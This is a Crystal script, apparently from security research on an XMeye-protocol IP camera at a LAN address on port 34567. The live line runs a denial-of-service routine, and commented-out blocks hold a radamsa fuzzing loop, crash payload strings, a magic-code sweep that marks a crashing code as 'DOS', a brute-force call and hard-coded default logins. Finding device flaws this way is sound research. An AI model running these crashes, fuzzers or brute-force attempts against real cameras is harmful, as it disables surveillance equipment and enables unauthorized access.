require "json"
require "socket"

require "./magic_fuzzer"
require "./denial_of_service"

puts DenialOfService.use_size_int("192.168.11.109", command: Command::Unknown)


# File.open("./logs/test.log", "w+") do |file|
#   m = MagicFuzzer(Command::SystemInfo).new(
#     magic: (0x0000..0x1000),
#     username: "admin",
#     password: "password",
#     output: file
#     )
#   m.run
#   m.wait_until_done
#   m.report
#   m.close
# end

# File.open("./rsrc/get_safety_ability.txt", "w+") do |file|
#   file.print Command::GetSafetyAbility.new(session_id: 0x00000000_u32).message
# end

# File.open("./logs/radamsa/get_safety_ability.log", "w+") do |file|
#   puts "Testing connection"
#   socket = XMSocket.new("192.168.11.109", 34567)
#   xmm = Command::GetSafetyAbility.new
#   socket.send_message xmm
#   puts "SENT: #{xmm.message}"
#   reply = socket.receive_message
#   puts "GOT: #{reply.message}"

#   1000.times do |x|
#     begin
#       socket = XMSocket.new("192.168.11.109", 34567)
#       xmm = Command::GetSafetyAbility.new
#       xmm.message = `radamsa ./rsrc/get_safety_ability.txt` 
#       file.puts "Sending"
#       socket.send_message xmm
#       file.puts "Sent: #{xmm.message.inspect}"
#       reply = socket.receive_message
#       file.puts "GOT: #{reply.message.inspect}"
#     rescue e : XMError::SocketException
#       puts "SOCKET DOWN! #{e.inspect}"
#       raise e
#     rescue e : XMError::Exception
#       file.puts "ERROR: #{e.inspect}"
#       puts "ERROR: #{e.inspect}"
#     rescue e
#       file.puts "BAD ERROR: #{e.inspect}"
#       puts "BAD ERROR: #{e.inspect}"
#     ensure
#       socket.close
#     end
#   end
# end

# xmm = Command::SystemInfo.new
# socket = XMSocket.new("192.168.11.109", 34567)
# socket.login("admin", Dahua.digest("password"))
# socket.send_message xmm
# puts "SENT:"
# reply = socket.receive_message
# puts "GOT: #{reply.message}"

#Brute.run("ORsEWe7l")


# BASIC
# crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
# crash_string = "{\"OPMonitor\":\"OPMonitor\",\"Name\":{\"Action\":\"Claim\",\"Parameter\":{\"Channel\":1,\"CombinMode\":\"NONE\",\"StreamType\":\"Main\",\"TransMode\":\"TCP\"}},\"SessionID\":\"9223372036854775676xAbcdef18446744073709551616\"}"
# crash_string = "{\"GetSafetyAbility\":0}"

# crash_string = "\"\""
# puts "SENDING: #{crash_string}"

# socket = XMSocket.new("192.168.11.109", 34567)
# xmm = Command::OPMonitor.new
# xmm.message = crash_string
# socket.send_message xmm
# puts "SENDING: #{crash_string}"
# reply = socket.receive_message
# puts "GOT: #{reply.message}"











# xmm.magic = 0x03f1 # LOGOUT?
# xmm.magic = 0x03fc # LOGOUT?
# xmm.magic = 0x041c # LOGOUT?
# xmm.magic = 0x0586 # LOGOUT?
# xmm.magic = 0x0598 # LOGOUT?
# xmm.magic = 0x059c # LOGOUT?
# xmm.magic = 0x05a4 # LOGOUT?
# xmm.magic = 0x05aa # LOGOUT?
# xmm.magic = 0x05d2 # LOGOUT?
# 0x6ec : Logout
# 0x6f0
# xmm.magic = 0x07de
# 0x07d0
# 0x07da
# 0x07db
# xmm.magic = 0x07e4
# 0x07ef
# 0x07f0
# 0x07f2
# 0x07fa

# BINGO! xmm.magic = 0x0678 # DOS DOS!
# 0x07f6

# xmm = Command::NoName.new
# PASSWORD = Dahua.digest("password")
# m = XMSocket.new("192.168.11.109", 34567)
# m.login("admin", PASSWORD)

# xmm.magic = 0x0000
# m.send_message xmm
# puts m.receive_message.message

# xmm.magic = 0x0550
# m.send_message xmm
# puts m.receive_message.message

# (0x2f00..0xFFFF).each do |x|
#   xmm.magic = x.to_u16

#   begin
#     print '.' if x % 0x100 == 0
#     m.send_message xmm
#     m.receive_message.message
#   rescue e
#     puts "#{x} : #{e}"
#     raise e
#   end
# end

# xmm.magic = 0x07f6

# m.send_message xmm
# puts m.receive_message.message #.bytes.map{|x| x.to_s(16).rjust(2, '0')}

# xmm.magic = 0x0000

# m.send_message xmm
# puts m.receive_message.message

# File.open("../besder_resources/logs/users/user/camera_param.log", "w") do |file|
#   Fuzzer.run(
#     Command::CameraParam,
#     magic2: (0x3..0x8),
#     username: "default",
#     password: "tluafed",
#     output: file
#     )
# end
